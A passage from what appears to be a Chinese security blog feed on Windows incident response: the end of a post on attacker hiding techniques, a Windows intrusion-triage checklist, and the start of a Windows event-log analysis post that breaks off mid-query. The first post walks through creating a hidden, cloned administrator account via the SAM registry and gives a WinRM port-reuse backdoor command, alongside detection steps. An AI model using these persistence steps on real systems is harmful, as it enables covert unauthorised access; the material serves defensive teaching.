class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dat</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.dll</span><br><span class="line"><span class="name">c</span>:\WINDOWS\xlkfs.ini</span><br><span class="line"><span class="name">c</span>:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>那么你，应该是遭遇了驱动级文件隐藏。</p><p>如何清除？</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态： <span class="keyword">sc</span> qc xlkfs</span><br><span class="line">2、停止服务： <span class="keyword">net</span> stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务： <span class="keyword">sc</span> delete xlkfs</span><br><span class="line">4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。</span><br></pre></td></tr></table></figure><p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p><p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p><h3 id="0x02-隐藏账号"><a href="#0x02-隐藏账号" class="headerlink" title="0x02 隐藏账号"></a>0x02 隐藏账号</h3><p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-4.png" alt=""></p><p>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p><p>克隆账号制作过程：</p><p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-5.png" alt=""></p><p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-6.png" alt=""></p><p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-7.png" alt=""></p><p>4、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-8.png" alt=""></p><p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p><p>检测和清理方法：</p><p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-9.png" alt=""></p><h3 id="0x03-端口复用"><a href="#0x03-端口复用" class="headerlink" title="0x03 端口复用"></a>0x03 端口复用</h3><p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p><p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p><p><code>winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</code></p><p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-19.png" alt=""></p><p>当执行这条命令的同时，将在安全日志中留下痕迹，</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-20.png" alt=""></p><p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></p><h3 id="0x04-进程注入"><a href="#0x04-进程注入" class="headerlink" title="0x04 进程注入"></a>0x04 进程注入</h3><p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p><p><strong>1、meterpreter会话注入</strong></p><p>当前权限无法获取hash值，查看目前系统进程</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-10.png" alt=""></p><p>通过migrate将进程注入到system进程后，成功获得hash值。</p><p><img src="./image/privilege-1-11.png" alt=""></p><p>Window后门排查：</p><p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。 </p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-12.png" alt=""></p><p><strong>2、Empire会话进程注入</strong></p><p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-13.png" alt=""></p><p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-14.png" alt=""></p><p><img src="./image/privilege-1-15.png" alt=""></p><p><strong>3、Cobalt Strike进程注入</strong></p><p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-16.png" alt=""></p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-17.png" alt=""></p><p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p><p><img src="https://gitee.com/eviden/img/raw/master/privilege-1-18.png" alt=""></p><h3 id="0x05-结束"><a href="#0x05-结束" class="headerlink" title="0x05  结束"></a>0x05  结束</h3><p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/dd41cd94.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/dd41cd94.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查"><a href="#第1篇：windows-入侵排查" class="headerlink" title="第1篇：windows 入侵排查"></a>第1篇：windows 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-1.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 — 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-3.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 — 运行 — 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 — 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>  没有签名验证信息的进程  没有描述信息的进程  进程的属主  进程的路径是否合法  CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​    b、查看进程对应的 PID：任务管理器 — 查看 — 选择列 — PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 — 选择对应进程 — 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 — PID — 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-4.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line">  <span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第02章：日志分析篇第1篇：Windows日志分析</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/68c6ad09.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/68c6ad09.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:57:09.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇-Windows日志分析"><a href="#第1篇-Windows日志分析" class="headerlink" title="第1篇:Windows日志分析"></a>第1篇:Windows日志分析</h2><h3 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/<span class="number">2000</span>操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %<span class="params">System</span>Root%\<span class="params">System</span>32\Winevt\Logs\<span class="params">System</span>.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-1.png" alt=""></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-2.png" alt=""></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-3.png" alt=""></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><div class="table-container"><table><thead><tr><th style="text-align:left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">4624</td><td>登录成功</td></tr><tr><td style="text-align:left">4625</td><td>登录失败</td></tr><tr><td style="text-align:left">4634</td><td>注销成功</td></tr><tr><td style="text-align:left">4647</td><td>用户启动的注销</td></tr><tr><td style="text-align:left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td style="text-align:left">4720</td><td>创建用户</td></tr></tbody></table></div><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><div class="table-container"><table><thead><tr><th style="text-align:left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td style="text-align:left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td style="text-align:left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td style="text-align:left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td style="text-align:left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td style="text-align:left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td style="text-align:left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td style="text-align:left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td style="text-align:left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table></div><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  —登录成功<br>4625  —登录失败<br>4634 — 注销成功<br>4647 — 用户启动的注销<br>4672 — 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-4.png" alt=""></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="./image/log-1-5.png" alt=""></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-6.png" alt=""></p><p><strong>基本查询结构</strong> </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser<span class="selector-class">.exe</span> –<span class="selector-tag">i</span>:EVT –o:DATAGRID <span class="string">&quot;SELECT * FROM c:\xx.evtx&quot;</span></span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 